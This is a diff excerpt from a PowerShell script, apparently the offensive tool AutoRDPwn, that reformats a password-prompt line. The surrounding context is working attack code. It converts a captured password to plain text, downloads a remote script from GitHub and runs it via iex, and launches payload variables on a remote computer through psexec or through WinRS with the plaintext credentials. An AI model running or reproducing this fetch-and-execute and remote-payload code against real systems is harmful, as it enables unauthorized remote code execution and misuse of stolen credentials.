@@ -235,8 +235,8 @@ if($Language -in 'Spanish') {
 	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop")  
-	Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } 
+	$Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1" -UseBasicParsing | iex
 	if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe "$Pwn1" -nobanner -accepteula
         .\psexec.exe \\$computer -h -d powershell.exe "$Pwn2" -nobanner -accepteula
@@ -324,8 +324,8 @@ if($Language -in 'Spanish') {
 	Write-Host "$txt24" -NoNewLine -ForegroundColor Gray ; Write-Host $currentuser.split('\')[1].trim() }
         Write-Host ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
         $password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
-	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop")  
-	Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } ; $Host.UI.RawUI.ForegroundColor = 'Blue'
+	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
+	$Host.UI.RawUI.ForegroundColor = 'Blue'
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
         WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
